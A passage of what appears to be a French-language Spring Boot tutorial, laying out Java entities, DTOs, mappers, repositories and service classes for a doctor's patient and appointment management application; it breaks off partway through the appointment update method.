    ANNULE,        // Rendez-vous annulé
    ABSENT         // Patient absent
}
```

---

### Entity/Prescription.java (Bonus)

```java
package DoctorApp.DoctorApp.Entity;

import jakarta.persistence.*;
import lombok.*;

import java.time.LocalDate;

@Entity
@Getter
@Setter
@ToString(exclude = {"patient", "medecin"})
@Builder
@NoArgsConstructor
@AllArgsConstructor
@Table(name = "prescriptions")
public class Prescription {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @ManyToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "patient_id", nullable = false)
    private Patient patient;

    @ManyToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "medecin_id", nullable = false)
    private Utilisateur medecin;

    @ManyToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "appointment_id")
    private Appointment appointment;  // Lien optionnel avec le RDV

    @Column(nullable = false)
    private LocalDate dateCreation = LocalDate.now();

    @Column(nullable = false, length = 3000)
    private String contenu;  // Le texte de l'ordonnance

    @Column(length = 1000)
    private String medicaments;  // Liste des médicaments

    @Column(length = 1000)
    private String instructions;

    private LocalDate dateValidite;  // Date jusqu'à laquelle l'ordonnance est valide
}
```

---

<a name="2-patient-dtos"></a>
## 2️⃣ DTOs POUR PATIENT

### DTO/Patient/PatientRequestDto.java

```java
package DoctorApp.DoctorApp.DTO.Patient;

import DoctorApp.DoctorApp.Entity.Genre;
import jakarta.validation.constraints.*;
import lombok.Data;

import java.time.LocalDate;

@Data
public class PatientRequestDto {

    @NotBlank(message = "Le nom est obligatoire")
    @Size(min = 2, max = 100, message = "Le nom doit contenir entre 2 et 100 caractères")
    private String nom;

    @NotBlank(message = "Le prénom est obligatoire")
    @Size(min = 2, max = 100, message = "Le prénom doit contenir entre 2 et 100 caractères")
    private String prenom;

    @NotBlank(message = "L'email est obligatoire")
    @Email(message = "Format d'email invalide")
    private String email;

    @Pattern(regexp = "^[0-9]{9,20}$", message = "Numéro de téléphone invalide")
    private String telephone;

    @NotNull(message = "La date de naissance est obligatoire")
    @Past(message = "La date de naissance doit être dans le passé")
    private LocalDate dateNaissance;

    @NotNull(message = "Le genre est obligatoire")
    private Genre genre;

    @Size(max = 500, message = "L'adresse ne peut pas dépasser 500 caractères")
    private String adresse;

    @Pattern(regexp = "^(A|B|AB|O)[+-]$", message = "Groupe sanguin invalide (ex: A+, O-, AB+)")
    private String groupeSanguin;

    @Size(max = 2000, message = "Les allergies ne peuvent pas dépasser 2000 caractères")
    private String allergies;

    @Size(max = 2000, message = "Les antécédents ne peuvent pas dépasser 2000 caractères")
    private String antecedentsMedicaux;

    private Long utilisateurId;  // Optionnel : lier à un compte utilisateur
}
```

### DTO/Patient/PatientResponseDto.java

```java
package DoctorApp.DoctorApp.DTO.Patient;

import DoctorApp.DoctorApp.Entity.Genre;
import lombok.Data;

import java.time.LocalDate;

@Data
public class PatientResponseDto {

    private Long id;
    private String nom;
    private String prenom;
    private String nomComplet;  // nom + prenom
    private String email;
    private String telephone;
    private LocalDate dateNaissance;
    private int age;  // Calculé automatiquement
    private Genre genre;
    private String adresse;
    private String groupeSanguin;
    private String allergies;
    private String antecedentsMedicaux;
    private boolean actif;
    private LocalDate dateCreation;
    private LocalDate dateModification;

    // Info utilisateur lié (si existe)
    private Long utilisateurId;
    private String utilisateurEmail;
}
```

### DTO/Patient/PatientUpdateDto.java

```java
package DoctorApp.DoctorApp.DTO.Patient;

import DoctorApp.DoctorApp.Entity.Genre;
import jakarta.validation.constraints.*;
import lombok.Data;

import java.time.LocalDate;

@Data
public class PatientUpdateDto {

    @Size(min = 2, max = 100, message = "Le nom doit contenir entre 2 et 100 caractères")
    private String nom;

    @Size(min = 2, max = 100, message = "Le prénom doit contenir entre 2 et 100 caractères")
    private String prenom;

    @Email(message = "Format d'email invalide")
    private String email;

    @Pattern(regexp = "^[0-9]{9,20}$", message = "Numéro de téléphone invalide")
    private String telephone;

    @Past(message = "La date de naissance doit être dans le passé")
    private LocalDate dateNaissance;

    private Genre genre;

    @Size(max = 500, message = "L'adresse ne peut pas dépasser 500 caractères")
    private String adresse;

    @Pattern(regexp = "^(A|B|AB|O)[+-]$", message = "Groupe sanguin invalide")
    private String groupeSanguin;

    @Size(max = 2000, message = "Les allergies ne peuvent pas dépasser 2000 caractères")
    private String allergies;

    @Size(max = 2000, message = "Les antécédents ne peuvent pas dépasser 2000 caractères")
    private String antecedentsMedicaux;

    private Boolean actif;
}
```

### DTO/Patient/PatientSummaryDto.java (Pour les listes)

```java
package DoctorApp.DoctorApp.DTO.Patient;

import DoctorApp.DoctorApp.Entity.Genre;
import lombok.Data;

import java.time.LocalDate;

/**
 * DTO léger pour l'affichage dans les listes
 */
@Data
public class PatientSummaryDto {

    private Long id;
    private String nomComplet;
    private String email;
    private String telephone;
    private int age;
    private Genre genre;
    private boolean actif;
    private LocalDate dateCreation;
}
```

---

<a name="3-appointment-dtos"></a>
## 3️⃣ DTOs POUR APPOINTMENT

### DTO/Appointment/AppointmentRequestDto.java

```java
package DoctorApp.DoctorApp.DTO.Appointment;

import jakarta.validation.constraints.*;
import lombok.Data;

import java.time.LocalDateTime;

@Data
public class AppointmentRequestDto {

    @NotNull(message = "L'ID du patient est obligatoire")
    private Long patientId;

    @NotNull(message = "L'ID du médecin est obligatoire")
    private Long medecinId;

    @NotNull(message = "La date de début est obligatoire")
    @Future(message = "La date de début doit être dans le futur")
    private LocalDateTime dateHeureDebut;

    @NotNull(message = "La date de fin est obligatoire")
    private LocalDateTime dateHeureFin;

    @Size(max = 100, message = "Le motif ne peut pas dépasser 100 caractères")
    private String motif;

    @Size(max = 2000, message = "Les notes ne peuvent pas dépasser 2000 caractères")
    private String notes;
}
```

### DTO/Appointment/AppointmentResponseDto.java

```java
package DoctorApp.DoctorApp.DTO.Appointment;

import DoctorApp.DoctorApp.DTO.Patient.PatientSummaryDto;
import DoctorApp.DoctorApp.Entity.StatutAppointment;
import lombok.Data;

import java.time.LocalDateTime;

@Data
public class AppointmentResponseDto {

    private Long id;

    // Infos patient
    private Long patientId;
    private String patientNom;
    private String patientPrenom;
    private String patientEmail;
    private String patientTelephone;

    // Infos médecin
    private Long medecinId;
    private String medecinNom;
    private String medecinEmail;

    // Détails RDV
    private LocalDateTime dateHeureDebut;
    private LocalDateTime dateHeureFin;
    private long dureeMinutes;
    private StatutAppointment statut;
    private String motif;
    private String notes;
    private String diagnostic;
    private String traitement;

    // Audit
    private LocalDateTime dateCreation;
    private LocalDateTime dateModification;
}
```

### DTO/Appointment/AppointmentUpdateDto.java

```java
package DoctorApp.DoctorApp.DTO.Appointment;

import DoctorApp.DoctorApp.Entity.StatutAppointment;
import jakarta.validation.constraints.Size;
import lombok.Data;

import java.time.LocalDateTime;

@Data
public class AppointmentUpdateDto {

    private LocalDateTime dateHeureDebut;
    private LocalDateTime dateHeureFin;
    private StatutAppointment statut;

    @Size(max = 100, message = "Le motif ne peut pas dépasser 100 caractères")
    private String motif;

    @Size(max = 2000, message = "Les notes ne peuvent pas dépasser 2000 caractères")
    private String notes;

    @Size(max = 2000, message = "Le diagnostic ne peut pas dépasser 2000 caractères")
    private String diagnostic;

    @Size(max = 2000, message = "Le traitement ne peut pas dépasser 2000 caractères")
    private String traitement;
}
```

### DTO/Appointment/AppointmentSummaryDto.java

```java
package DoctorApp.DoctorApp.DTO.Appointment;

import DoctorApp.DoctorApp.Entity.StatutAppointment;
import lombok.Data;

import java.time.LocalDateTime;

/**
 * DTO léger pour les listes de rendez-vous
 */
@Data
public class AppointmentSummaryDto {

    private Long id;
    private String patientNomComplet;
    private String medecinNom;
    private LocalDateTime dateHeureDebut;
    private long dureeMinutes;
    private StatutAppointment statut;
    private String motif;
}
```

---

<a name="4-mappers"></a>
## 4️⃣ MAPPERS

### Mapper/PatientMapper.java

```java
package DoctorApp.DoctorApp.Mapper;

import DoctorApp.DoctorApp.DTO.Patient.PatientRequestDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientResponseDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientSummaryDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientUpdateDto;
import DoctorApp.DoctorApp.Entity.Patient;
import DoctorApp.DoctorApp.Entity.Utilisateur;
import DoctorApp.DoctorApp.Exception.ResourceNotFoundException;
import DoctorApp.DoctorApp.repository.UtilisateursRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.BeanUtils;
import org.springframework.stereotype.Component;

@Component
@RequiredArgsConstructor
public class PatientMapper {

    private final UtilisateursRepository utilisateursRepository;

    /**
     * Entity → ResponseDto
     */
    public PatientResponseDto toDto(Patient entity) {
        if (entity == null) {
            return null;
        }

        PatientResponseDto dto = new PatientResponseDto();

        // Copie automatique des champs simples
        BeanUtils.copyProperties(entity, dto);

        // Champs calculés
        dto.setNomComplet(entity.getNom() + " " + entity.getPrenom());
        dto.setAge(entity.getAge());

        // Info utilisateur lié
        if (entity.getUtilisateur() != null) {
            dto.setUtilisateurId(entity.getUtilisateur().getId());
            dto.setUtilisateurEmail(entity.getUtilisateur().getEmail());
        }

        return dto;
    }

    /**
     * RequestDto → Entity
     */
    public Patient toEntity(PatientRequestDto dto) {
        if (dto == null) {
            return null;
        }

        Patient entity = new Patient();

        // Copie automatique
        BeanUtils.copyProperties(dto, entity);

        // Lier l'utilisateur si fourni
        if (dto.getUtilisateurId() != null) {
            Utilisateur utilisateur = utilisateursRepository.findById(dto.getUtilisateurId())
                    .orElseThrow(() -> new ResourceNotFoundException("Utilisateur non trouvé"));
            entity.setUtilisateur(utilisateur);
        }

        return entity;
    }

    /**
     * Entity → SummaryDto (version légère)
     */
    public PatientSummaryDto toSummaryDto(Patient entity) {
        if (entity == null) {
            return null;
        }

        PatientSummaryDto dto = new PatientSummaryDto();

        dto.setId(entity.getId());
        dto.setNomComplet(entity.getNom() + " " + entity.getPrenom());
        dto.setEmail(entity.getEmail());
        dto.setTelephone(entity.getTelephone());
        dto.setAge(entity.getAge());
        dto.setGenre(entity.getGenre());
        dto.setActif(entity.isActif());
        dto.setDateCreation(entity.getDateCreation());

        return dto;
    }

    /**
     * Mise à jour d'une entité depuis UpdateDto
     */
    public void updateEntityFromDto(PatientUpdateDto dto, Patient entity) {
        if (dto == null || entity == null) {
            return;
        }

        // Mise à jour conditionnelle
        if (dto.getNom() != null) {
            entity.setNom(dto.getNom());
        }
        if (dto.getPrenom() != null) {
            entity.setPrenom(dto.getPrenom());
        }
        if (dto.getEmail() != null) {
            entity.setEmail(dto.getEmail());
        }
        if (dto.getTelephone() != null) {
            entity.setTelephone(dto.getTelephone());
        }
        if (dto.getDateNaissance() != null) {
            entity.setDateNaissance(dto.getDateNaissance());
        }
        if (dto.getGenre() != null) {
            entity.setGenre(dto.getGenre());
        }
        if (dto.getAdresse() != null) {
            entity.setAdresse(dto.getAdresse());
        }
        if (dto.getGroupeSanguin() != null) {
            entity.setGroupeSanguin(dto.getGroupeSanguin());
        }
        if (dto.getAllergies() != null) {
            entity.setAllergies(dto.getAllergies());
        }
        if (dto.getAntecedentsMedicaux() != null) {
            entity.setAntecedentsMedicaux(dto.getAntecedentsMedicaux());
        }
        if (dto.getActif() != null) {
            entity.setActif(dto.getActif());
        }
    }
}
```

---

### Mapper/AppointmentMapper.java

```java
package DoctorApp.DoctorApp.Mapper;

import DoctorApp.DoctorApp.DTO.Appointment.AppointmentRequestDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentResponseDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentSummaryDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentUpdateDto;
import DoctorApp.DoctorApp.Entity.Appointment;
import DoctorApp.DoctorApp.Entity.Patient;
import DoctorApp.DoctorApp.Entity.Utilisateur;
import DoctorApp.DoctorApp.Exception.ResourceNotFoundException;
import DoctorApp.DoctorApp.repository.PatientRepository;
import DoctorApp.DoctorApp.repository.UtilisateursRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.BeanUtils;
import org.springframework.stereotype.Component;

@Component
@RequiredArgsConstructor
public class AppointmentMapper {

    private final PatientRepository patientRepository;
    private final UtilisateursRepository utilisateursRepository;

    /**
     * Entity → ResponseDto
     */
    public AppointmentResponseDto toDto(Appointment entity) {
        if (entity == null) {
            return null;
        }

        AppointmentResponseDto dto = new AppointmentResponseDto();

        // Copie automatique des champs simples
        BeanUtils.copyProperties(entity, dto);

        // Infos patient
        if (entity.getPatient() != null) {
            dto.setPatientId(entity.getPatient().getId());
            dto.setPatientNom(entity.getPatient().getNom());
            dto.setPatientPrenom(entity.getPatient().getPrenom());
            dto.setPatientEmail(entity.getPatient().getEmail());
            dto.setPatientTelephone(entity.getPatient().getTelephone());
        }

        // Infos médecin
        if (entity.getMedecin() != null) {
            dto.setMedecinId(entity.getMedecin().getId());
            dto.setMedecinNom(entity.getMedecin().getNom());
            dto.setMedecinEmail(entity.getMedecin().getEmail());
        }

        // Durée calculée
        dto.setDureeMinutes(entity.getDureeMinutes());

        return dto;
    }

    /**
     * RequestDto → Entity
     */
    public Appointment toEntity(AppointmentRequestDto dto) {
        if (dto == null) {
            return null;
        }

        Appointment entity = new Appointment();

        // Copie automatique (dateHeureDebut, dateHeureFin, motif, notes)
        BeanUtils.copyProperties(dto, entity);

        // Charger le patient
        Patient patient = patientRepository.findById(dto.getPatientId())
                .orElseThrow(() -> new ResourceNotFoundException("Patient non trouvé"));
        entity.setPatient(patient);

        // Charger le médecin
        Utilisateur medecin = utilisateursRepository.findById(dto.getMedecinId())
                .orElseThrow(() -> new ResourceNotFoundException("Médecin non trouvé"));
        entity.setMedecin(medecin);

        return entity;
    }

    /**
     * Entity → SummaryDto
     */
    public AppointmentSummaryDto toSummaryDto(Appointment entity) {
        if (entity == null) {
            return null;
        }

        AppointmentSummaryDto dto = new AppointmentSummaryDto();

        dto.setId(entity.getId());
        dto.setPatientNomComplet(
                entity.getPatient().getNom() + " " + entity.getPatient().getPrenom()
        );
        dto.setMedecinNom(entity.getMedecin().getNom());
        dto.setDateHeureDebut(entity.getDateHeureDebut());
        dto.setDureeMinutes(entity.getDureeMinutes());
        dto.setStatut(entity.getStatut());
        dto.setMotif(entity.getMotif());

        return dto;
    }

    /**
     * Mise à jour depuis UpdateDto
     */
    public void updateEntityFromDto(AppointmentUpdateDto dto, Appointment entity) {
        if (dto == null || entity == null) {
            return;
        }

        if (dto.getDateHeureDebut() != null) {
            entity.setDateHeureDebut(dto.getDateHeureDebut());
        }
        if (dto.getDateHeureFin() != null) {
            entity.setDateHeureFin(dto.getDateHeureFin());
        }
        if (dto.getStatut() != null) {
            entity.setStatut(dto.getStatut());
        }
        if (dto.getMotif() != null) {
            entity.setMotif(dto.getMotif());
        }
        if (dto.getNotes() != null) {
            entity.setNotes(dto.getNotes());
        }
        if (dto.getDiagnostic() != null) {
            entity.setDiagnostic(dto.getDiagnostic());
        }
        if (dto.getTraitement() != null) {
            entity.setTraitement(dto.getTraitement());
        }
    }
}
```

---

<a name="5-interfaces"></a>
## 5️⃣ INTERFACES DE SERVICES

### Service/IPatientService.java

```java
package DoctorApp.DoctorApp.Service;

import DoctorApp.DoctorApp.DTO.Patient.PatientRequestDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientResponseDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientSummaryDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientUpdateDto;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;

import java.util.List;

/**
 * Interface des services de gestion des patients
 */
public interface IPatientService {

    /**
     * Crée un nouveau patient
     */
    PatientResponseDto createPatient(PatientRequestDto requestDto);

    /**
     * Récupère un patient par son ID
     */
    PatientResponseDto getPatientById(Long id);

    /**
     * Récupère un patient par son email
     */
    PatientResponseDto getPatientByEmail(String email);

    /**
     * Récupère tous les patients
     */
    List<PatientResponseDto> getAllPatients();

    /**
     * Récupère tous les patients actifs
     */
    List<PatientSummaryDto> getAllActivePatients();

    /**
     * Récupère les patients avec pagination
     */
    Page<PatientResponseDto> getAllPatients(Pageable pageable);

    /**
     * Recherche des patients par nom ou prénom
     */
    List<PatientSummaryDto> searchPatients(String keyword);

    /**
     * Met à jour un patient
     */
    PatientResponseDto updatePatient(Long id, PatientUpdateDto updateDto);

    /**
     * Supprime un patient (soft delete)
     */
    void deletePatient(Long id);

    /**
     * Active/désactive un patient
     */
    PatientResponseDto togglePatientStatus(Long id, boolean actif);

    /**
     * Vérifie si un email existe déjà
     */
    boolean existsByEmail(String email);
}
```

---

### Service/IAppointmentService.java

```java
package DoctorApp.DoctorApp.Service;

import DoctorApp.DoctorApp.DTO.Appointment.AppointmentRequestDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentResponseDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentSummaryDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentUpdateDto;
import DoctorApp.DoctorApp.Entity.StatutAppointment;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.List;

/**
 * Interface des services de gestion des rendez-vous
 */
public interface IAppointmentService {

    /**
     * Crée un nouveau rendez-vous
     */
    AppointmentResponseDto createAppointment(AppointmentRequestDto requestDto);

    /**
     * Récupère un rendez-vous par son ID
     */
    AppointmentResponseDto getAppointmentById(Long id);

    /**
     * Récupère tous les rendez-vous
     */
    Page<AppointmentResponseDto> getAllAppointments(Pageable pageable);

    /**
     * Récupère les rendez-vous d'un patient
     */
    List<AppointmentSummaryDto> getAppointmentsByPatient(Long patientId);

    /**
     * Récupère les rendez-vous d'un médecin
     */
    List<AppointmentSummaryDto> getAppointmentsByMedecin(Long medecinId);

    /**
     * Récupère les rendez-vous pour une date donnée
     */
    List<AppointmentSummaryDto> getAppointmentsByDate(LocalDate date);

    /**
     * Récupère les rendez-vous entre deux dates
     */
    List<AppointmentSummaryDto> getAppointmentsBetweenDates(
            LocalDateTime dateDebut,
            LocalDateTime dateFin
    );

    /**
     * Récupère les rendez-vous par statut
     */
    List<AppointmentSummaryDto> getAppointmentsByStatut(StatutAppointment statut);

    /**
     * Récupère les prochains rendez-vous d'un patient
     */
    List<AppointmentSummaryDto> getUpcomingAppointmentsByPatient(Long patientId);

    /**
     * Met à jour un rendez-vous
     */
    AppointmentResponseDto updateAppointment(Long id, AppointmentUpdateDto updateDto);

    /**
     * Change le statut d'un rendez-vous
     */
    AppointmentResponseDto changeAppointmentStatus(Long id, StatutAppointment statut);

    /**
     * Annule un rendez-vous
     */
    void cancelAppointment(Long id);

    /**
     * Supprime un rendez-vous
     */
    void deleteAppointment(Long id);

    /**
     * Vérifie si un créneau est disponible
     */
    boolean isTimeSlotAvailable(Long medecinId, LocalDateTime dateHeureDebut, LocalDateTime dateHeureFin);
}
```

---

<a name="6-implementations"></a>
## 6️⃣ IMPLÉMENTATION DES SERVICES

### Repository/PatientRepository.java

```java
package DoctorApp.DoctorApp.repository;

import DoctorApp.DoctorApp.Entity.Patient;
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import org.springframework.stereotype.Repository;

import java.util.List;
import java.util.Optional;

@Repository
public interface PatientRepository extends JpaRepository<Patient, Long> {

    Optional<Patient> findByEmail(String email);

    boolean existsByEmail(String email);

    List<Patient> findByActifTrue();

    @Query("SELECT p FROM Patient p WHERE " +
            "LOWER(p.nom) LIKE LOWER(CONCAT('%', :keyword, '%')) OR " +
            "LOWER(p.prenom) LIKE LOWER(CONCAT('%', :keyword, '%')) OR " +
            "LOWER(p.email) LIKE LOWER(CONCAT('%', :keyword, '%'))")
    List<Patient> searchPatients(@Param("keyword") String keyword);
}
```

---

### Repository/AppointmentRepository.java

```java
package DoctorApp.DoctorApp.repository;

import DoctorApp.DoctorApp.Entity.Appointment;
import DoctorApp.DoctorApp.Entity.StatutAppointment;
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import org.springframework.stereotype.Repository;

import java.time.LocalDateTime;
import java.util.List;

@Repository
public interface AppointmentRepository extends JpaRepository<Appointment, Long> {

    List<Appointment> findByPatientId(Long patientId);

    List<Appointment> findByMedecinId(Long medecinId);

    List<Appointment> findByStatut(StatutAppointment statut);

    @Query("SELECT a FROM Appointment a WHERE " +
            "DATE(a.dateHeureDebut) = DATE(:date)")
    List<Appointment> findByDate(@Param("date") LocalDateTime date);

    @Query("SELECT a FROM Appointment a WHERE " +
            "a.dateHeureDebut BETWEEN :dateDebut AND :dateFin")
    List<Appointment> findBetweenDates(
            @Param("dateDebut") LocalDateTime dateDebut,
            @Param("dateFin") LocalDateTime dateFin
    );

    @Query("SELECT a FROM Appointment a WHERE " +
            "a.patient.id = :patientId AND " +
            "a.dateHeureDebut > :now " +
            "ORDER BY a.dateHeureDebut ASC")
    List<Appointment> findUpcomingByPatient(
            @Param("patientId") Long patientId,
            @Param("now") LocalDateTime now
    );

    @Query("SELECT COUNT(a) > 0 FROM Appointment a WHERE " +
            "a.medecin.id = :medecinId AND " +
            "a.statut NOT IN ('ANNULE', 'ABSENT') AND " +
            "((a.dateHeureDebut < :dateFin AND a.dateHeureFin > :dateDebut))")
    boolean existsConflictingAppointment(
            @Param("medecinId") Long medecinId,
            @Param("dateDebut") LocalDateTime dateDebut,
            @Param("dateFin") LocalDateTime dateFin
    );
}
```

---

### Service/PatientServiceImpl.java

```java
package DoctorApp.DoctorApp.Service;

import DoctorApp.DoctorApp.DTO.Patient.PatientRequestDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientResponseDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientSummaryDto;
import DoctorApp.DoctorApp.DTO.Patient.PatientUpdateDto;
import DoctorApp.DoctorApp.Entity.Patient;
import DoctorApp.DoctorApp.Exception.DuplicateResourceException;
import DoctorApp.DoctorApp.Exception.ResourceNotFoundException;
import DoctorApp.DoctorApp.Mapper.PatientMapper;
import DoctorApp.DoctorApp.repository.PatientRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.List;
import java.util.stream.Collectors;

@Service
@RequiredArgsConstructor
public class PatientServiceImpl implements IPatientService {

    private final PatientRepository patientRepository;
    private final PatientMapper patientMapper;

    @Override
    @Transactional
    public PatientResponseDto createPatient(PatientRequestDto requestDto) {

        // Vérifier l'unicité de l'email
        if (patientRepository.existsByEmail(requestDto.getEmail())) {
            throw new DuplicateResourceException("Un patient avec cet email existe déjà");
        }

        // Convertir DTO → Entity
        Patient patient = patientMapper.toEntity(requestDto);

        // Sauvegarder
        Patient savedPatient = patientRepository.save(patient);

        // Retourner le DTO
        return patientMapper.toDto(savedPatient);
    }

    @Override
    @Transactional(readOnly = true)
    public PatientResponseDto getPatientById(Long id) {
        Patient patient = patientRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException("Patient non trouvé avec l'ID : " + id));

        return patientMapper.toDto(patient);
    }

    @Override
    @Transactional(readOnly = true)
    public PatientResponseDto getPatientByEmail(String email) {
        Patient patient = patientRepository.findByEmail(email)
                .orElseThrow(() -> new ResourceNotFoundException("Patient non trouvé avec l'email : " + email));

        return patientMapper.toDto(patient);
    }

    @Override
    @Transactional(readOnly = true)
    public List<PatientResponseDto> getAllPatients() {
        return patientRepository.findAll().stream()
                .map(patientMapper::toDto)
                .collect(Collectors.toList());
    }

    @Override
    @Transactional(readOnly = true)
    public List<PatientSummaryDto> getAllActivePatients() {
        return patientRepository.findByActifTrue().stream()
                .map(patientMapper::toSummaryDto)
                .collect(Collectors.toList());
    }

    @Override
    @Transactional(readOnly = true)
    public Page<PatientResponseDto> getAllPatients(Pageable pageable) {
        return patientRepository.findAll(pageable)
                .map(patientMapper::toDto);
    }

    @Override
    @Transactional(readOnly = true)
    public List<PatientSummaryDto> searchPatients(String keyword) {
        return patientRepository.searchPatients(keyword).stream()
                .map(patientMapper::toSummaryDto)
                .collect(Collectors.toList());
    }

    @Override
    @Transactional
    public PatientResponseDto updatePatient(Long id, PatientUpdateDto updateDto) {

        // Charger le patient
        Patient patient = patientRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException("Patient non trouvé avec l'ID : " + id));

        // Vérifier l'unicité de l'email si modifié
        if (updateDto.getEmail() != null && !updateDto.getEmail().equals(patient.getEmail())) {
            if (patientRepository.existsByEmail(updateDto.getEmail())) {
                throw new DuplicateResourceException("Cet email est déjà utilisé");
            }
        }

        // Mettre à jour
        patientMapper.updateEntityFromDto(updateDto, patient);

        // Sauvegarder
        Patient updatedPatient = patientRepository.save(patient);

        return patientMapper.toDto(updatedPatient);
    }

    @Override
    @Transactional
    public void deletePatient(Long id) {
        if (!patientRepository.existsById(id)) {
            throw new ResourceNotFoundException("Patient non trouvé avec l'ID : " + id);
        }

        patientRepository.deleteById(id);
    }

    @Override
    @Transactional
    public PatientResponseDto togglePatientStatus(Long id, boolean actif) {
        Patient patient = patientRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException("Patient non trouvé avec l'ID : " + id));

        patient.setActif(actif);

        Patient updatedPatient = patientRepository.save(patient);

        return patientMapper.toDto(updatedPatient);
    }

    @Override
    @Transactional(readOnly = true)
    public boolean existsByEmail(String email) {
        return patientRepository.existsByEmail(email);
    }
}
```

---

### Service/AppointmentServiceImpl.java

```java
package DoctorApp.DoctorApp.Service;

import DoctorApp.DoctorApp.DTO.Appointment.AppointmentRequestDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentResponseDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentSummaryDto;
import DoctorApp.DoctorApp.DTO.Appointment.AppointmentUpdateDto;
import DoctorApp.DoctorApp.Entity.Appointment;
import DoctorApp.DoctorApp.Entity.StatutAppointment;
import DoctorApp.DoctorApp.Exception.ResourceNotFoundException;
import DoctorApp.DoctorApp.Mapper.AppointmentMapper;
import DoctorApp.DoctorApp.repository.AppointmentRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.util.List;
import java.util.stream.Collectors;

@Service
@RequiredArgsConstructor
public class AppointmentServiceImpl implements IAppointmentService {

    private final AppointmentRepository appointmentRepository;
    private final AppointmentMapper appointmentMapper;

    @Override
    @Transactional
    public AppointmentResponseDto createAppointment(AppointmentRequestDto requestDto) {

        // Vérifier que le créneau est disponible
        if (!isTimeSlotAvailable(
                requestDto.getMedecinId(),
                requestDto.getDateHeureDebut(),
                requestDto.getDateHeureFin()
        )) {
            throw new IllegalStateException("Ce créneau horaire n'est pas disponible");
        }

        // Convertir DTO → Entity
        Appointment appointment = appointmentMapper.toEntity(requestDto);

        // Statut par défaut
        appointment.setStatut(StatutAppointment.PLANIFIE);

        // Sauvegarder
        Appointment savedAppointment = appointmentRepository.save(appointment);

        return appointmentMapper.toDto(savedAppointment);
    }

    @Override
    @Transactional(readOnly = true)
    public AppointmentResponseDto getAppointmentById(Long id) {
        Appointment appointment = appointmentRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException("Rendez-vous non trouvé avec l'ID : " + id));

        return appointmentMapper.toDto(appointment);
    }

    @Override
    @Transactional(readOnly = true)
    public Page<AppointmentResponseDto> getAllAppointments(Pageable pageable) {
        return appointmentRepository.findAll(pageable)
                .map(appointmentMapper::toDto);
    }

    @Override
    @Transactional(readOnly = true)
    public List<AppointmentSummaryDto> getAppointmentsByPatient(Long patientId) {
        return appointmentRepository.findByPatientId(patientId).stream()
                .map(appointmentMapper::toSummaryDto)
                .collect(Collectors.toList());
    }

    @Override
    @Transactional(readOnly = true)
    public List<AppointmentSummaryDto> getAppointmentsByMedecin(Long medecinId) {
        return appointmentRepository.findByMedecinId(medecinId).stream()
                .map(appointmentMapper::toSummaryDto)
                .collect(Collectors.toList());
    }

    @Override
    @Transactional(readOnly = true)
    public List<AppointmentSummaryDto> getAppointmentsByDate(LocalDate date) {
        LocalDateTime dateTime = date.atStartOfDay();
        return appointmentRepository.findByDate(dateTime).stream()
                .map(appointmentMapper::toSummaryDto)
                .collect(Collectors.toList());
    }

    @Override
    @Transactional(readOnly = true)
    public List<AppointmentSummaryDto> getAppointmentsBetweenDates(
            LocalDateTime dateDebut,
            LocalDateTime dateFin
    ) {
        return appointmentRepository.findBetweenDates(dateDebut, dateFin).stream()
                .map(appointmentMapper::toSummaryDto)
                .collect(Collectors.toList());
    }

    @Override
    @Transactional(readOnly = true)
    public List<AppointmentSummaryDto> getAppointmentsByStatut(StatutAppointment statut) {
        return appointmentRepository.findByStatut(statut).stream()
                .map(appointmentMapper::toSummaryDto)
                .collect(Collectors.toList());
    }

    @Override
    @Transactional(readOnly = true)
    public List<AppointmentSummaryDto> getUpcomingAppointmentsByPatient(Long patientId) {
        return appointmentRepository.findUpcomingByPatient(patientId, LocalDateTime.now()).stream()
                .map(appointmentMapper::toSummaryDto)
                .collect(Collectors.toList());
    }

    @Override
    @Transactional
    public AppointmentResponseDto updateAppointment(Long id, AppointmentUpdateDto updateDto) {

        Appointment appointment = appointmentRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException("Rendez-vous non trouvé avec l'ID : " + id));

        // Si on change les horaires, vérifier la disponibilité
        if (updateDto.getDateHeureDebut() != null || updateDto.getDateHeureFin() != null) {
            LocalDateTime newDebut = updateDto.getDateHeureDebut() != null ?
                    updateDto.getDateHeureDebut() : appointment.getDateHeureDebut();
